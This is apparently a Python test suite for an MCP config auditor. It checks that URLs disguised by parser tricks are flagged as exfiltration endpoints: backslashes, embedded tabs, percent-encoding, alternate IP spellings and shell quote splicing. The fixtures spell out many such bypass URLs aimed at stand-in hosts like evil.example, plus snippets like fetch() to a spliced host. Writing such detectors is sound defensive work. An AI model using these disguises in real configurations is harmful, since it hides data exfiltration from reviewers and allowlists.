r"""A URL's host is judged as every URL parser would read it (finding R2-1).

`https://evil.example\@api.github.com/c` has the host api.github.com for
Python's urlsplit - an allowlisted API - and the host evil.example for Node's
`new URL`, a browser, Deno or Bun, which treat a backslash like a slash. The
config was graded A with no findings. Likewise `http://localhost<TAB>.evil...`
(a WHATWG parser drops tabs and line breaks) and `ht<TAB>tps://evil...`.

The rule under test: a URL is quiet only when EVERY host a parser could take
it to point to is the local machine or a trusted API host.
"""

import json
import os
import unittest

from mcp_audit import detectors

from _support import isolated_machine, run_all_formats, run_cli, write_json

TAB, LF, CR = "\t", "\n", "\r"
KELVIN = chr(0x212A)        # lower-cases to the ASCII "k": api.slack.com
U_UMLAUT = chr(0xFC)
E_ACUTE = chr(0xE9)
FULLWIDTH_EVIL = "".join(chr(ord(c) + 0xFEE0) for c in "evil")

EXFIL = ("critical", "exfiltration-endpoint")
EXFIL_ENV = ("medium", "exfiltration-endpoint")
UNPARSEABLE = ("high", "unparseable-url")


def in_args(url):
    return {"command": "node", "args": ["server.js", url]}


def in_env(url):
    return {"command": "node", "args": ["server.js"], "env": {"BASE": url}}


def checks(findings):
    return [(f["severity"], f["check"]) for f in findings]


# (label, text, host that must be in the message, parsers disagree?)
# Every one was read as local or allowlisted - so, no finding - before.
LOUD = [
    ("reviewer repro: backslash hides the real host",
     "https://evil.example\\@api.github.com/c", "evil.example", True),
    ("backslash before localhost",
     "https://evil.example\\@localhost/c", "evil.example", True),
    ("backslash before a loopback IP",
     "http://evil.example\\@127.0.0.1:8080/c", "evil.example", True),
    ("backslash after an allowlisted host",
     "https://api.github.com\\.evil.example/x",
     "api.github.com\\.evil.example", True),
    ("tab splices a name together",
     "http://localhost" + TAB + ".evil.example/x",
     "localhost.evil.example", False),
    ("line feed splices a name together",
     "http://localhost" + LF + ".evil.example/x",
     "localhost.evil.example", False),
    ("carriage return splices a name together",
     "http://localhost" + CR + ".evil.example/x",
     "localhost.evil.example", False),
    ("tab splices onto an allowlisted host",
     "https://api.github.com" + TAB + ".evil.example/x",
     "api.github.com.evil.example", False),
    ("tab inside the scheme",
     "ht" + TAB + "tps://evil.example/x", "evil.example", False),
    ("line feed inside the scheme",
     "ws" + LF + "s://evil.example/x", "evil.example", False),
    ("userinfo that looks like an allowlisted host",
     "https://api.github.com@evil.example/x", "evil.example", False),
    ("userinfo with a port that looks like one",
     "https://api.github.com:443@evil.example/x", "evil.example", False),
    ("allowlisted name as a prefix",
     "https://api.github.com.evil.example/x", "api.github.com.evil.example",
     False),
    ("allowlisted suffix without the dot",
     "https://evilgoogleapis.com/", "evilgoogleapis.com", False),
    ("plain http to an API host",
     "http://api.github.com/", "api.github.com", False),
    ("localhost as a subdomain",
     "http://localhost.evil.example/x", "localhost.evil.example", False),
    ("localhost as a prefix",
     "http://localhost-backup/x", "localhost-backup", False),
    ("two trailing dots",
     "http://localhost../x", "localhost..", False),
    ("two trailing dots on an API host",
     "https://api.github.com../x", "api.github.com..", False),
    ("percent-encoded 'localhost'",
     "http://%6c%6f%63%61%6c%68%6f%73%74/x",
     "%6c%6f%63%61%6c%68%6f%73%74", True),
    ("percent-encoded dot after localhost",
     "http://localhost%2eevil.example/x", "localhost%2eevil.example", True),
    ("percent-encoded slash after an API host",
     "https://api.github.com%2f.evil.example/x",
     "api.github.com%2f.evil.example", True),
    ("Kelvin sign lower-cases to k: api.slack.com",
     "https://api.slac" + KELVIN + ".com/x", "api.slac" + KELVIN + ".com",
     False),
    ("full-width letters",
     "https://" + FULLWIDTH_EVIL + ".example/x", FULLWIDTH_EVIL + ".example",
     False),
    ("an internationalised name",
     "https://m" + U_UMLAUT + "nchen.example/x", "m" + U_UMLAUT + "nchen.example",
     False),
    ("hex spelling of 127.0.0.1", "http://0x7f.1/x", "0x7f.1", False),
    ("octal spelling of 127.0.0.1", "http://0177.0.0.1/x", "0177.0.0.1",
     False),
    ("decimal spelling of 127.0.0.1", "http://2130706433/x", "2130706433",
     False),
    ("short spelling of 127.0.0.1", "http://127.1/x", "127.1", False),
    ("hex spelling of 192.168.0.1", "http://0xC0A80001/x", "0xC0A80001",
     False),
    ("an IPv4-mapped public IPv6 address",
     "http://[::ffff:8.8.8.8]/x", "[::ffff:8.8.8.8]", False),
    ("a link-local IPv6 address", "http://[fe80::1]/x", "[fe80::1]", False),
    ("three slashes", "http:///evil.example/x", "evil.example", False),
    ("backslashes instead of slashes", "http:\\\\evil.example/x",
     "evil.example", False),
    ("JSON-escaped slashes", "https:\\/\\/evil.example\\/x", "evil.example",
     False),
    ("wss", "wss://c2.example.net/ws", "c2.example.net", False),
    ("one slash", "http:/evil.example/x", "evil.example", False),
    # a space or a quote ends a word in a script, but in a URL it is part of
    # the userinfo - or of the name (a WHATWG parser resolves a quote)
    ("space in the userinfo",
     "https://localhost y@evil.example/sse", "evil.example", False),
    ("space in the userinfo, allowlisted look-alike",
     "https://api.github.com y@evil.example/sse", "evil.example", False),
    ("quote in the userinfo",
     "https://localhost'y@evil.example/sse", "evil.example", False),
    ("double quote in the userinfo",
     "https://localhost\"y@evil.example/sse", "evil.example", False),
    ("angle bracket in the userinfo",
     "https://localhost>y@evil.example/sse", "evil.example", False),
    ("quote inside the name",
     "https://localhost'.evil.example/x", "localhost'.evil.example", False),
    ("angle bracket inside the name",
     "https://localhost>.evil.example/x", "localhost>.evil.example", False),
    ("quote right after the slashes",
     "https://\"evil.example/x", "\"evil.example", False),
]

QUIET = [
    "http://localhost/x", "http://LOCALHOST:3000", "http://localhost./x",
    "HTTP://LocalHost:8080/mcp", "http://127.0.0.1:8080", "http://127.0.0.2:1/",
    "http://0.0.0.0:8000", "http://[::1]:5000/", "http://[0:0:0:0:0:0:0:1]/",
    "http://[::]/", "http://[::ffff:127.0.0.1]/", "http://[::ffff:7f00:1]/",
    "ws://localhost:9000", "http://localhost:${PORT}/mcp",
    "https://api.github.com/x", "https://api.github.com./x",
    "HTTPS://API.GITHUB.COM/x", "https://api.github.com:443/x",
    "https://user:pw@api.github.com/x", "wss://api.openai.com/v1/realtime",
    "https://sheets.googleapis.com/v4",
    # a backslash, tab or line break that cannot change the host
    "https://api.github.com/a\\b", "https://api.github.com/x?u=a\\b",
    "https://api.github.com/a" + TAB + "b", "http://localhost:3000/a\\b\\c",
    "https://api.github.com/x#a\\b",
    # the end of a line / a text that goes on
    "http://127.0.0.1:8080" + LF, "https://api.github.com/x" + LF + "npx foo",
    "curl -s http://localhost:8080" + LF + "echo done",
    "http://localhost:3000" + CR + LF + "npx foo",
    # a URL followed by words: nothing after a space is part of the host
    "https://api.github.com is the API", "http://localhost:3000 (dev server)",
    "http://localhost (dev server)",
    # a scheme with nothing after it is not a URL
    "https:// is the scheme", "starts with http:// or ws://", "http:///",
    "wss:\\\\ and more",
]


class TestEveryReadingMustBeQuiet(unittest.TestCase):
    def test_bypasses_in_args_are_critical_and_name_the_real_host(self):
        for label, url, host, disagree in LOUD:
            f = detectors.detect_exfiltration("x", in_args(url))
            want = [EXFIL] + ([UNPARSEABLE] if disagree else [])
            self.assertEqual(checks(f), want, f"{label}: {f}")
            self.assertIn("://" + host, f[0]["message"], label)

    def test_the_same_urls_in_env_are_medium(self):
        for label, url, host, disagree in LOUD:
            f = detectors.detect_exfiltration("x", in_env(url))
            want = [EXFIL_ENV] + ([UNPARSEABLE] if disagree else [])
            self.assertEqual(checks(f), want, f"{label}: {f}")
            self.assertIn("://" + host, f[0]["message"], label)

    def test_quiet_urls_stay_quiet_in_args_env_and_the_url_field(self):
        for url in QUIET:
            for cfg in (in_args(url), in_env(url)):
                self.assertEqual(detectors.detect_exfiltration("x", cfg), [],
                                 repr(url))

    def test_a_host_that_cannot_be_encoded_is_unparseable(self):
        url = "https://" + E_ACUTE * 70 + ".example/x"      # label over 63
        f = detectors.detect_exfiltration("x", in_args(url))
        self.assertEqual(checks(f), [UNPARSEABLE])

    def test_broken_brackets_stay_unparseable(self):
        for url in ("http://[x", "http://[x]/", "http://[::1]evil/",
                    "http://[::1%25eth0]/", "http://a[b/", "http://a]b/",
                    "http://[::1/x"):
            f = detectors.detect_exfiltration("x", in_args(url))
            self.assertEqual(checks(f), [UNPARSEABLE], repr(url))

    def test_neither_message_echoes_the_url_part_that_can_hold_a_secret(self):
        secret_user, secret_query = "S3CR3T-BSUSER-1", "S3CR3T-BSQUERY-2"
        url = (f"https://{secret_user}:{secret_user}\\@evil.example/p"
               f"?t={secret_query}")
        f = detectors.detect_exfiltration("x", in_args(url))
        self.assertEqual(checks(f), [EXFIL, UNPARSEABLE])
        text = json.dumps(f)
        self.assertNotIn(secret_user, text)
        self.assertNotIn(secret_query, text)
        self.assertNotIn("evil.example", f[1]["message"])

    def test_a_secret_before_a_backslash_is_not_printed_as_a_host(self):
        # To a WHATWG parser the host is the text before the backslash - here
        # what looks like a token. Only a dotted name or an address is printed.
        token = "S3CR3T-USERTOKEN-3"
        url = f"https://{token}\\@api.github.com/x"
        f = detectors.detect_exfiltration("x", in_args(url))
        self.assertEqual(checks(f), [EXFIL, UNPARSEABLE])
        self.assertNotIn(token, json.dumps(f))
        self.assertIn("://<host>/", f[0]["message"])

    def test_a_dotted_name_before_a_backslash_is_printed(self):
        f = detectors.detect_exfiltration(
            "x", in_args("https://evil.example\\@api.github.com/x"))
        self.assertIn("://evil.example/", f[0]["message"])

    def test_tabs_and_line_breaks_inside_a_longer_text_are_removed_too(self):
        # `fetch('http://localhost<TAB>.evil.example')` in a node -e snippet
        for script in ("fetch('http://localhost" + TAB + ".evil.example/x')",
                       "fetch('ht" + LF + "tps://evil.example/x')",
                       "get('https://api.github.com" + CR + ".evil.example')"):
            cfg = {"command": "node", "args": ["-e", script]}
            f = detectors.detect_exfiltration("x", cfg)
            self.assertEqual(checks(f), [EXFIL], repr(script))
            self.assertIn("evil.example", f[0]["message"])

    def test_a_remote_url_in_text_with_line_breaks_is_reported_once(self):
        cfg = {"command": "sh", "args": [
            "-c", "echo start" + LF + "ping https://evil.example/c" + TAB
            + "more" + LF + "echo end"]}
        f = detectors.detect_exfiltration("x", cfg)
        self.assertEqual(checks(f), [EXFIL])

    def test_one_bad_reading_does_not_hide_another_url(self):
        cfg = {"command": "node", "args": [
            "https://evil.example\\@api.github.com/c",
            "https://other.example/x"]}
        f = detectors.detect_exfiltration("x", cfg)
        self.assertEqual(checks(f), [EXFIL, UNPARSEABLE, EXFIL])
        self.assertIn("://other.example", f[2]["message"])

    def test_a_line_break_does_not_hide_a_url_from_the_next_line(self):
        cfg = {"command": "node", "args": [
            "http://localhost:3000" + LF + "https://evil.example/c"]}
        f = detectors.detect_exfiltration("x", cfg)
        self.assertEqual(checks(f), [EXFIL])
        self.assertIn("://evil.example", f[0]["message"])


class TestWhereAProgramGetsAUrlFrom(unittest.TestCase):
    """A program takes its URL from a whole argument, from `--url=...`, from
    `KEY=...` or from a string inside a JSON argument - and parses all of it,
    spaces included. A shell script's words end at a space instead; both are
    read."""

    SPLIT = "https://localhost y@evil.example/sse"

    def _hosts(self, cfg):
        f = detectors.detect_exfiltration("x", cfg)
        return checks(f), "".join(x["message"] for x in f)

    def test_the_whole_argument_is_a_url(self):
        got, text = self._hosts({"command": "node", "args": [self.SPLIT]})
        self.assertEqual(got, [EXFIL])
        self.assertIn("://evil.example", text)

    def test_the_value_after_an_equals_sign_is_a_url(self):
        for arg in ("--url=" + self.SPLIT, "BASE_URL=" + self.SPLIT):
            got, text = self._hosts({"command": "node", "args": [arg]})
            self.assertEqual(got, [EXFIL], arg)
            self.assertIn("://evil.example", text)

    def test_a_string_inside_a_json_argument_is_a_url(self):
        for doc in ({"url": self.SPLIT}, [{"a": {"b": [self.SPLIT]}}]):
            arg = json.dumps(doc)
            got, text = self._hosts(
                {"command": "node", "args": ["--config", arg]})
            self.assertEqual(got, [EXFIL], arg)
            self.assertIn("://evil.example", text)

    def test_json_escapes_that_a_parser_will_decode_are_read(self):
        arg = json.dumps({"url": "http://localhost" + TAB + ".evil.example/"})
        self.assertIn("\\t", arg)         # the text holds a backslash and a t
        got, text = self._hosts({"command": "node", "args": ["--c", arg]})
        self.assertIn(EXFIL, got)
        self.assertIn("://localhost.evil.example", text)

    def test_json_escaped_slashes_of_a_local_url_are_fine(self):
        arg = json.dumps({"url": "http://localhost:3000/mcp"}).replace(
            "/", "\\/")
        self.assertIn("http:\\/\\/localhost", arg)
        self.assertEqual(self._hosts({"command": "node",
                                      "args": ["--config", arg]})[0], [])

    def test_an_env_value_is_a_url(self):
        got, text = self._hosts({"command": "node", "args": ["s.js"],
                                 "env": {"BASE": self.SPLIT}})
        self.assertEqual(got, [EXFIL_ENV])

    def test_each_argument_is_its_own_unit(self):
        # The old text joined the arguments with spaces, so a quiet URL and
        # the words after it were one string.
        cfg = {"command": "node",
               "args": ["http://localhost:3000", "y@evil.example/sse"]}
        self.assertEqual(self._hosts(cfg)[0], [])

    def test_words_after_a_url_in_a_script_are_not_userinfo(self):
        script = ("node s.js http://localhost:3000 --owner me@elsewhere.example"
                  " && echo done")
        cfg = {"command": "sh", "args": ["-c", script]}
        self.assertEqual(self._hosts(cfg)[0], [])

    def test_a_malformed_url_in_an_argument_is_reported_once(self):
        cfg = {"command": "node", "args": ["http://[x"]}
        self.assertEqual(self._hosts(cfg)[0], [UNPARSEABLE])

    def test_deeply_nested_or_huge_json_arguments_are_harmless(self):
        for arg in ("[" * 200_000, "[" * 5000 + "]" * 5000,
                    "{" + '"a": "x", ' * 100_000 + '"b": 1}',
                    json.dumps(["https://api.github.com/x"] * 5000)):
            f = detectors.detect_exfiltration(
                "x", {"command": "node", "args": [arg]})
            self.assertEqual(f, [], arg[:20])


class TestTheUrlField(unittest.TestCase):
    """`{"url": ...}` is a remote server by design (medium), unless every
    reading of it is the local machine."""

    def test_a_disguised_remote_server_is_not_local(self):
        for url, host in (
                ("https://evil.example\\@localhost/mcp", "evil.example"),
                ("http://127.0.0.1\\@evil.example/mcp", "evil.example"),
                ("http://localhost" + TAB + ".evil.example/mcp",
                 "localhost.evil.example"),
                ("http://%6c%6f%63%61%6c%68%6f%73%74/mcp",
                 "%6c%6f%63%61%6c%68%6f%73%74"),
                ("http://localhost.evil.example/mcp",
                 "localhost.evil.example")):
            f = detectors.detect_exfiltration("x", {"url": url})
            self.assertEqual(checks(f)[0], ("medium", "remote-server"), url)
            self.assertIn("://" + host, f[0]["message"], url)

    def test_a_url_that_cannot_be_taken_apart_is_unparseable(self):
        for url in ("https://[x/mcp", "http://[::1]evil/", "http://a]b/"):
            f = detectors.detect_exfiltration("x", {"url": url})
            self.assertEqual(checks(f), [UNPARSEABLE], url)

    def test_disagreeing_parsers_are_one_more_finding(self):
        f = detectors.detect_exfiltration(
            "x", {"url": "https://evil.example\\@localhost/mcp"})
        self.assertEqual(checks(f), [("medium", "remote-server"), UNPARSEABLE])

    def test_local_spellings_stay_quiet(self):
        for url in ("http://localhost:8080/sse", "http://localhost./sse",
                    "http://[::1]:8080/", "http://[::ffff:127.0.0.1]:8080/",
                    "HTTP://LOCALHOST/sse", "ws://127.0.0.1:9/"):
            self.assertEqual(
                detectors.detect_exfiltration("x", {"url": url}), [], url)

    def test_an_api_host_is_still_a_remote_server(self):
        f = detectors.detect_exfiltration(
            "x", {"url": "https://api.github.com/mcp"})
        self.assertEqual(checks(f), [("medium", "remote-server")])


class TestReviewerRepro(unittest.TestCase):
    """The panel's exact URL, through the CLI: grade A, no findings and
    `--fail-on critical` exit 0 before the fix."""

    def _config(self, cwd, url):
        return write_json(os.path.join(cwd, "m.json"), {"mcpServers": {
            "x": {"command": "node", "args": ["server.js", url]}}})

    def test_it_is_critical_in_every_format(self):
        url = "https://evil.example\\@api.github.com/c"
        with isolated_machine() as (home, cwd):
            p = self._config(cwd, url)
            for fmt, (code, out, err) in run_all_formats(
                    "--config", p, "--fail-on", "critical").items():
                self.assertEqual(code, 1, (fmt, out, err))
                self.assertIn("evil.example", out, fmt)
                self.assertNotIn("api.github.com", out, fmt)
            code, out, err = run_cli("--config", p, "--format", "json")
        (res,) = json.loads(out)["results"]
        self.assertNotIn(res["grade"], ("A", "B", "C"))
        self.assertEqual(
            [(f["severity"], f["check"]) for f in res["findings"]],
            [EXFIL, UNPARSEABLE])

    def test_a_tab_splice_is_critical_too(self):
        url = "http://localhost" + TAB + ".evil.example/x"
        with isolated_machine() as (home, cwd):
            p = self._config(cwd, url)
            for fmt, (code, out, err) in run_all_formats(
                    "--config", p, "--fail-on", "critical").items():
                self.assertEqual(code, 1, (fmt, out, err))

    def test_legitimate_urls_still_grade_a(self):
        with isolated_machine() as (home, cwd):
            p = write_json(os.path.join(cwd, "m.json"), {"mcpServers": {
                "x": {"command": "node", "args": [
                    "server.js", "http://localhost:3000/a\\b",
                    "https://api.github.com./x"],
                    "env": {"BASE": "HTTPS://API.OPENAI.COM/v1"}}}})
            code, out, err = run_cli("--config", p, "--format", "json",
                                     "--fail-on", "low")
        self.assertEqual(code, 0, (out, err))
        (res,) = json.loads(out)["results"]
        self.assertEqual((res["grade"], res["findings"]), ("A", []))


class TestAUrlThatAShellPutsTogether(unittest.TestCase):
    """`bash -c "node x.js https://''evil.example/c"` runs node with
    `https://evil.example/c`: the shell takes the quotes out. The scan for
    endpoints reads the text of a script as written, and a quote ends a URL
    there, so the URL was not seen at all (found while fixing the same gap in
    a `git+` spec). The words the shell hands over are scanned as well."""

    WHERE = ("critical", "exfiltration-endpoint")
    CHECKS = ("exfiltration-endpoint", "unparseable-url", "git-source",
              "package-registry", "remote-server")

    @staticmethod
    def script(text, shell="bash"):
        if shell == "cmd":
            return {"command": "cmd", "args": ["/c", text]}
        return {"command": shell, "args": ["-c", text]}

    def found(self, cfg):
        return [f for f in detectors.audit_server("s", cfg, [], ())
                if f["check"] in self.CHECKS]

    SPLICES = (
        ("empty quotes in front of the host", "node x.js https://''evil.example/c"),
        ("empty double quotes", 'node x.js https://""evil.example/c'),
        ("quotes in the scheme", "node x.js ht''tps://evil.example/c"),
        ("a quoted scheme", 'node x.js "https://"evil.example/c'),
        ("a quoted host", "node x.js https://'evil'.example/c"),
        ("in a pipeline", "echo hi | node x.js https://''evil.example/c"),
        ("after another command", "cd /tmp && node x.js https://''evil.example/c"),
        ("in a command substitution", "node x.js $(echo https://''evil.example/c)"),
    )

    def test_a_spliced_url_is_the_endpoint_it_is(self):
        want = self.found(self.script("node x.js https://evil.example/c"))
        self.assertEqual([(f["severity"], f["check"]) for f in want],
                         [self.WHERE])
        for label, text in self.SPLICES:
            for shell in ("bash", "sh", "zsh"):
                with self.subTest(label, shell=shell):
                    self.assertEqual(self.found(self.script(text, shell)),
                                     want)

    # The text as written is a URL of its own here (with another host); the
    # shell makes the one on the right of the comment out of it.
    SPLICES_THAT_ARE_A_URL_AS_WRITTEN = (
        ("a quote in the middle of the host", "node x.js https://evil'.'example/c"),
        ("a backslash before a letter", "node x.js https://e\\vil.example/c"),
    )

    def test_a_spliced_url_is_found_next_to_the_one_the_text_spells(self):
        want = self.found(self.script("node x.js https://evil.example/c"))
        for label, text in self.SPLICES_THAT_ARE_A_URL_AS_WRITTEN:
            for shell in ("bash", "sh", "zsh"):
                with self.subTest(label, shell=shell):
                    found = self.found(self.script(text, shell))
                    for f in want:
                        self.assertIn(f, found)
                    for f in found:
                        self.assertIn((f["severity"], f["check"]),
                                      (self.WHERE,
                                       ("high", "unparseable-url")), found)

    def test_the_same_in_cmd(self):
        want = self.found(self.script("node x.js https://evil.example/c",
                                      "cmd"))
        self.assertEqual([(f["severity"], f["check"]) for f in want],
                         [self.WHERE])
        for text in ('node x.js https://""evil.example/c',
                     'node x.js ht""tps://evil.example/c'):
            with self.subTest(text):
                self.assertEqual(self.found(self.script(text, "cmd")), want)

    def test_a_spliced_package_source_is_an_endpoint_too(self):
        for text in ("npx -y git+https://''evil.example/o/r",
                     "uvx --from 'git+https://'\"evil.example\"/o/r tool"):
            with self.subTest(text):
                found = self.found(self.script(text))
                self.assertEqual([(f["severity"], f["check"])
                                  for f in found], [self.WHERE], found)

    def test_nothing_is_reported_twice(self):
        for text in ("node x.js https://evil.example/c",
                     "node x.js 'https://evil.example/c'",
                     "echo hi && node x.js https://evil.example/c"):
            with self.subTest(text):
                self.assertEqual(len(self.found(self.script(text))), 1)
        # two URLs of one host are two findings now, and two findings after
        text = ("node x.js https://evil.example/a https://evil.example/b")
        self.assertEqual(len(self.found(self.script(text))), 2)

    def test_what_is_quiet_stays_quiet(self):
        for text in ("node x.js 'http://localhost:3000/a'",
                     "node x.js http://''localhost:3000/a",
                     "node x.js https://''api.github.com/x",
                     "uvx --from 'git+https://github.com/o/r@%s' tool"
                     % ("0123456789abcdef0123456789abcdef01234567",),
                     "npx --registry 'https://registry.npmjs.org/' -y p@1.0.0"):
            with self.subTest(text):
                found = self.found(self.script(text))
                self.assertFalse([f for f in found
                                  if f["severity"] in ("critical", "high")],
                                 found)

    def test_a_source_in_a_script_is_still_judged_by_its_pin(self):
        found = self.found(self.script(
            "uvx --from 'git+https://github.com/o/r' tool"))
        self.assertEqual([(f["severity"], f["check"]) for f in found],
                         [("medium", "git-source")])

    def test_the_arguments_of_the_entry_are_not_a_script(self):
        # a program that is handed `ht''tps://evil.example` has quotes in its
        # argument, no shell takes them out
        cfg = {"command": "node", "args": ["x.js", "ht''tps://evil.example/c"]}
        self.assertEqual(self.found(cfg), [])

    def audit(self, text):
        return [(f["severity"], f["check"]) for f in detectors.audit_server(
            "s", self.script(text), [], ())]

    def test_a_script_of_many_urls_is_read_in_bounded_time(self):
        import time
        script = "node x.js " + " ".join(
            "https://''evil%d.example/c" % i for i in range(20000))
        start = time.monotonic()
        found = self.audit(script)
        self.assertLess(time.monotonic() - start, 10)
        self.assertIn(("critical", "exfiltration-endpoint"), found)

    def test_more_urls_than_are_read_make_the_entry_unaudited(self):
        # a script is read word by word up to a limit; padding it with quiet
        # URLs must not push a bad one out of sight - past the limit it is
        # reported as one that could not be read (and --deep leaves it alone)
        limit = detectors._MAX_SCRIPT_URLS
        pad = ["http://''localhost:3000/p%d" % i for i in range(limit)]
        found = self.audit("node x.js " + " ".join(
            pad + ["https://''evil.example/c"]))
        self.assertIn(("high", "detector-error"), found)
        # up to the limit it is read to the end
        found = self.audit("node x.js " + " ".join(
            pad[:limit - 1] + ["https://''evil.example/c"]))
        self.assertNotIn(("high", "detector-error"), found)
        self.assertIn(("critical", "exfiltration-endpoint"), found)
        # the same word any number of times is one word
        found = self.audit("node x.js " + " ".join(
            ["https://''evil.example/c"] * (limit + 50)))
        self.assertNotIn(("high", "detector-error"), found)


if __name__ == "__main__":
    unittest.main()
